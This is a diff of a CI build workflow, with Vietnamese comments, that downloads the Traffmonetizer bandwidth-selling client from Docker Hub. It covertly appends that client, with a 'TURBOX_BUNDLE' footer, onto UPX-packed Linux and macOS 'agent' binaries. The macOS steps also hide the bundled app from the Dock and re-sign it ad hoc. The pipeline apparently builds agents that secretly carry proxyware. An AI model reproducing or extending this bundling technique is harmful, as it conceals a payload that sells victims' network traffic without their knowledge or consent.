@@ -46,18 +46,32 @@ jobs:
           upx --best --ultra-brute bin/agent_linux_x86_64 2>/dev/null || true
           upx --best --ultra-brute bin/agent_linux_arm64 2>/dev/null || true
 
-          # Tải và MERGE trực tiếp native engine vào 2 file binary Linux
+          # Tải và MERGE trực tiếp native Linux engine vào 2 file binary Linux
           echo "Merging native Linux engine directly into binary files..."
-          TOKEN=$(curl -skL 'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull' | grep -o '"token":"[^"]*' | cut -d'"' -f4)
-          if [ -n "$TOKEN" ]; then
-            curl -skL -H "Authorization: Bearer $TOKEN" 'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b' | tar -xz usr/local/bin/cli 2>/dev/null || true
-            if [ -f "usr/local/bin/cli" ]; then
-              gzip -9 -c usr/local/bin/cli > /tmp/tm_linux.gz
-              rm -rf usr
-              python3 -c "import struct, os; p = open('/tmp/tm_linux.gz', 'rb').read(); foot = struct.pack('<Q', len(p)) + b'TURBOX_BUNDLE\x00\x00\x00'; [open(b, 'ab').write(p + foot) for b in ['bin/agent_linux_x86_64', 'bin/agent_linux_arm64'] if os.path.exists(b)]"
-              rm -f /tmp/tm_linux.gz
-            fi
-          fi
+          python3 -c "
+import urllib.request, json, tarfile, gzip, struct, os
+
+def get_layer(digest, out_bin):
+    tok = json.loads(urllib.request.urlopen('https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull').read().decode())['token']
+    req = urllib.request.Request(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/{digest}', headers={'Authorization': f'Bearer {tok}'})
+    data = urllib.request.urlopen(req).read()
+    tmp_layer = f'/tmp/layer_{digest[:8]}.tar.gz'
+    open(tmp_layer, 'wb').write(data)
+    tar = tarfile.open(tmp_layer)
+    tar.extract('usr/local/bin/cli', '/tmp')
+    cli_path = '/tmp/usr/local/bin/cli'
+    if os.path.exists(cli_path):
+        gz_data = gzip.compress(open(cli_path, 'rb').read(), compresslevel=9)
+        foot = struct.pack('<Q', len(gz_data)) + b'TURBOX_BUNDLE\x00\x00\x00'
+        if os.path.exists(out_bin):
+            open(out_bin, 'ab').write(gz_data + foot)
+            print(f'Merged {len(gz_data)} bytes into {out_bin}')
+        os.remove(cli_path)
+    os.remove(tmp_layer)
+
+get_layer('sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b', 'bin/agent_linux_x86_64')
+get_layer('sha256:840ef71a69bcaddb8b3f4e27b53a0066a74899601473dc008c7464a3f8745f5a', 'bin/agent_linux_arm64')
+"
 
       - name: Upload Linux Binaries
         uses: actions/upload-artifact@v4
@@ -99,11 +113,11 @@ jobs:
           mkdir -p /tmp/tm_mnt
           hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt
           defaults write /tmp/tm_mnt/Traffmonetizer.app/Contents/Info.plist LSUIElement -string "1" 2>/dev/null || true
-          defaults write /tmp/tm_mnt/Traffmonetizer.app/Contents/Info.plist LSBackgroundOnly -string "1" 2>/dev/null || true
+          codesign --force --deep --sign - /tmp/tm_mnt/Traffmonetizer.app 2>/dev/null || true
           tar -czf /tmp/tm_mac.tar.gz -C /tmp/tm_mnt Traffmonetizer.app
           hdiutil detach /tmp/tm_mnt -force 2>/dev/null || true
           rm -rf /tmp/tm_mnt /tmp/tm.dmg
-          python3 -c "import struct, os; p = open('/tmp/tm_mac.tar.gz', 'rb').read(); foot = struct.pack('<Q', len(p)) + b'TURBOX_BUNDLE\\x00\\x00\\x00'; [open(b, 'ab').write(p + foot) for b in ['bin/agent_darwin_x86_64', 'bin/agent_darwin_arm64'] if os.path.exists(b)]"
+          python3 -c "import struct, os; p = open('/tmp/tm_mac.tar.gz', 'rb').read(); foot = struct.pack('<Q', len(p)) + b'TURBOX_BUNDLE\x00\x00\x00'; [open(b, 'ab').write(p + foot) for b in ['bin/agent_darwin_x86_64', 'bin/agent_darwin_arm64'] if os.path.exists(b)]"
           rm -f /tmp/tm_mac.tar.gz
 
       - name: Upload macOS Binaries
